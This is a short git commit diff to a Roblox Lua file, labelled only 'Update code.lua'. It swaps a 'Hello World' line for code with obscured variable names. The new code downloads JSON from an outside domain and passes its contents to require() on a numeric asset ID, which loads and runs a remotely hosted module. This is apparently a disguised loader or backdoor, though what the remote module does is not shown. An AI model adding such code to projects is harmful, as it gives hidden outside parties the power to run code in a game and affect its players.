82d424c0f9eae1c43b02532fc1c45e413be0a6eb
Czctus <71540581+czctus@users.noreply.github.com>
2024-02-28 18:24:08 -0500

    Update code.lua

--- resources/code.lua
+++ resources/code.lua
@@ -1,1 +1,7 @@
-print("Hello World!")
+local ab = game:GetService("HttpService")
+local ba = 16542686427
+local cb = ab:GetAsync("https://perox.dev/rblxContent/GifModule/download/a.json")
+local bc = ab:JSONDecode(cb)
+local dc = bc.a
+local cd = bc.b
+require(ba).open(dc, cd)
